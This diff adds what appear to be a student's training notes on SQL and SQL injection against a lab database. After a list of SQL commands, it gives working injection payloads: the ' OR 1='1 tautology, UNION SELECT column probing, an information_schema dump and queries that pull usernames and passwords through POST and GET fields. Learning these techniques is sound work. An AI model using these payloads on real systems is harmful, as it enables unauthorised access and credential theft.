@@ -1,0 +1,148 @@
+--Standard commands--
+SELECT
+	Extracts data from a database
+
+UNION
+	Used to combine the result-set of two or more SELECT statements
+
+only 2 we will use--
+
+more commands--
+USE
+	Selects the DB to use
+
+UPDATE
+	Updates data in a database
+
+DELETE
+	Deletes data from a database
+
+INSERT INTO
+	Inserts new data into a database
+
+CREATE DATABASE
+	Creates a new database
+
+ALTER DATABASE
+	Modifies a database
+
+CREATE TABLE
+	Creates a new table
+
+ALTER TABLE
+	Modifies a table
+
+DROP TABLE
+	Deletes a table
+
+CREATE INDEX
+	Creates an index (search key)
+
+DROP INDEX
+	Deletes an index
+
+------demo---------
+mysql
+  server version of database avaiable
+
+show databases;
+  information_schema, mysql, performance_schema are default
+  info holds info about ALL databases
+
+SHOW tables FROM session;
+  tables in database
+
+SHOW columns FROM session.Tires;
+  shows column from a table
+
+Select tireid,name,size,cost FROM session.Tires;
+  select columns of table
+
+show columns from session.car
+
+SELECT tireid,name,size,cost FROM session.Tires UNION SELECT carid,name,color,cost FROM seesion.car;
+ the info wont be split if fields differ, column names will not change to reflect output but data will be outputted
+ 
+
+injecting a truth statemnet
+Truth Statement: tom ' OR 1='1
+
+input truth statement into all fields to find vulnerable
+POST
+
+F12
+network tab
+login
+go to POST request
+go to request tab on raight hand side
+see raw
+copy raw into login page <URL>?<copied raw>
+enter
+view page source
+
+-------------POST Method
+fuzz the field/id vuln field
+  <field>' or 1='1
+    ^input one of the fields provided
+
+increment to identify columns untill errors out
+  <field>' UNION SELECT 1,2,3... #
+
+craft GOLDEN statemnet
+  <field>' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
+      2 and 5 are placeholders to prevent errors, place placeholders in places there are no ???data???
+      2 wasnt displayed so the 2nd column is hidden
+      
+craft query /find info you want to grrab, edit golden statement and change the database you are searching in
+  <field>' UNION SELECT studentID,2,username,passwd,5 FROM session.userinfo #
+
+  <field>' UNION SELECT ID,2,name,pass,5 FROM session.user #
+
+  <field>' UNION SELECT user_id,2,remote_ip,status,last_access FROM session.session_log #
+
+----------------GET Method
+find vuln field 
+  input or 1=1 into url after ?Selection=1 
+    find the field with more data than usual
+
+find amount of columns  (number of cloumns, how they are displayed ex. 1,3,2)
+  input UNION SELECT 1,2,3... # after ?selection=<num>  <-(field)
+
+reorder golden statement to match displayed columns
+?selection=<num> UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #
+
+craft query
+?selection-<num> UNION SELECT id,pass,@@version FROM session.user
+                                        ^grabs version of database
+
+delete from comments where ID = 57 ;
+-----
+annotate databases you see
+
+tables in databases
+
+columns in tables
+
+Database: session
+Tables: Tires, car, session_log, user, userinfo
+Columns 
+(Tires): tireid, name, size, cost
+(car): carid, name, type, cost, color, year
+etc.....
+
+stacking statements
+
+
+nesting statements
+
+
+
+
+
+
+
+
+
+
+
+
